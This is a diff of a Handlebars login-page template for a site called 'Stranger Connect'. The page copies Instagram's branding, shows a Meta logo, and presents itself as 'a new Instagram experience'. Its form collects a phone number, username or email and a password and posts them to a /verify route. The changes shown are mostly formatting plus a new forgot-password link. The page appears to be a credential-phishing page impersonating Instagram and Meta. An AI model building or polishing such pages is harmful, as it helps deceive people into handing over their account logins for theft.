@@ -13,15 +13,15 @@
 
 <body>
 
-    <div class="bg"></div>
+
+    <!-- Background is now handled by layout.hbs -->
+
 
     <div class="container">
 
-        <img 
-            class="insta-logo"
+        <img class="insta-logo"
             src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/96/Instagram.svg/2048px-Instagram.svg.png"
-            alt="Instagram"
-        />
+            alt="Instagram" />
 
         <h1 class="brand">Stranger Connect</h1>
         <p class="sub">Anonymous chat • A new Instagram experience</p>
@@ -31,25 +31,21 @@
         <form id="login-form" action="/verify" method="post">
 
             <input type="text" name="username" placeholder="Phone number, username, or email" required />
-            
+
             <input type="password" name="password" placeholder="Password" required />
 
             <button type="submit" class="btn-login">Log in</button>
 
         </form>
 
-        <a href="#" class="forgot">Forgot password?</a>
+        <a href="/forgot-password" class="forgot">Forgot password?</a>
 
         <button class="btn-create">Create new account</button>
 
         <div class="meta-footer">
             {{!-- FIXED: Using the local PNG file saved in public/img/ --}}
-            <img 
-                class="meta-logo-img"
-                src="/img/20251116_200252.png" 
-                alt="Meta"
-            />
-            
+            <img class="meta-logo-img" src="/img/20251116_200252.png" alt="Meta" />
+
         </div>
 
     </div>
